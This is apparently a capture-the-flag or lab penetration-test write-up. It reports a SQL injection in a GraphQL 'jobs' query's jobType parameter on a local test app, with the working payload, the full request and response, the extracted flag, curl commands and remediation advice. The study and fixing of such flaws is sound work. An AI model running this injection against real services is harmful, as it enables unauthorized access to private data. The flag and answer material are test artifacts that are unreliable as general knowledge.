## TL;DR
- Objective: Exploit SQL Injection vulnerability in a GraphQL endpoint parameter
- Outcome: **ACHIEVED** - Successfully exploited SQL injection in `jobType` parameter of `jobs` query
- Highest-impact finding: Authentication bypass via SQL injection exposing private job data containing sensitive flag
- Validation status: **Confirmed** - Flag extracted via unauthorized data access

## Target Information
- Target: 127.0.0.1:32944
- Host / base URL: http://127.0.0.1:32944
- Application or component: Ultimate Job Aggregator
- Relevant technology details: Strawberry GraphQL framework with GraphiQL IDE enabled
- Authentication context: No authentication required for the vulnerable endpoint
- Endpoint: POST /graphql/ (trailing slash required)

## Confirmed Vulnerability
### SQL Injection in GraphQL `jobType` Parameter
- **Affected endpoint / component:** `POST /graphql/` - `jobs` query, `jobType` parameter (String!, required)
- **Impact:** High - Authorization bypass allowing access to private job records containing sensitive data (flag)
- **Preconditions:** None - No authentication required; GraphQL introspection/GraphiQL enabled for query discovery
- **Exact payload or PoC:**

```json
{"query":"{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"}
```

## Steps to Reproduce
1. Send a POST request to `http://127.0.0.1:32944/graphql/` with Content-Type `application/json`
2. Inject the SQL injection payload into the `jobType` parameter:
   ```json
   {"query":"{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"}
   ```
3. Observe that the response returns all job records including private job (id: 3) with name "Hidden job"
4. The `description` field of the private job contains the flag value

## Validation / Evidence
- **Validation token / flag:** `FLAG{435c23214a55a86fb4767013da8e1ac61feffa0ccfea01a5289b84effb8fbebd}`
- **Tool evidence:** Pattern match extraction confirmed flag presence in response
- **Request evidence:**

```http
POST /graphql/ HTTP/1.1
Host: 127.0.0.1:32944
Content-Type: application/json

{"query":"{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"}
```

- **Response evidence:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"data": {"jobs": [
  {"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"}, 
  {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}, 
  {"id": 3, "name": "Hidden job", "type": "private", "description": "FLAG{435c23214a55a86fb4767013da8e1ac61feffa0ccfea01a5289b84effb8fbebd}"}, 
  {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}
]}}
```

- **Notes on reliability / limitations:** The injection is 100% reliable. The `jobType` parameter directly interpolates user input into a SQL query without parameterization, allowing the classic `' OR '1'='1` bypass to return all records regardless of the `type` filter.

## Remediation
- **Root cause:** The GraphQL resolver for the `jobs` query constructs SQL queries using string concatenation or direct interpolation of the `jobType` parameter value instead of using parameterized queries/prepared statements.
- **Recommended fix:** 
  1. Implement parameterized queries (prepared statements) for all database interactions. Use the database driver's parameter binding feature instead of string interpolation.
  2. Example fix (pseudocode):
     ```python
     # Vulnerable (current):
     query = f"SELECT * FROM jobs WHERE type = '{jobType}'"
     
     # Secure:
     query = "SELECT * FROM jobs WHERE type = %s"
     cursor.execute(query, (jobType,))
     ```
  3. Additionally, implement proper authorization checks at the resolver level to enforce access control rules before returning private job data.
- **Defense-in-depth:** 
  - Disable GraphiQL/GraphQL Playground in production environments
  - Implement query complexity analysis and depth limiting
  - Apply principle of least privilege to database connections (read-only where possible)
  - Log and monitor for suspicious query patterns

## How to Verify the Fix
1. Send the same malicious payload:
   ```bash
   curl -X POST http://127.0.0.1:32944/graphql/ \
     -H "Content-Type: application/json" \
     -d '{"query":"{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"}'
   ```
2. **Expected secure result:** 
   - Either an empty result set (no jobs with type matching the literal string)
   - OR a GraphQL error indicating invalid input
   - The private job (id: 3) should NOT be returned
3. Verify legitimate queries still work:
   ```bash
   curl -X POST http://127.0.0.1:32944/graphql/ \
     -H "Content-Type: application/json" \
     -d '{"query":"{ jobs(jobType: \"front-end\") { id name type description } }"}'
   ```
   Should return only jobs with `type: "front-end"`

## Remaining Leads
- **Confirmed blockers:** None
- **Unverified leads:** None - primary objective achieved
- **Missing context:** None - full reproduction and validation completed
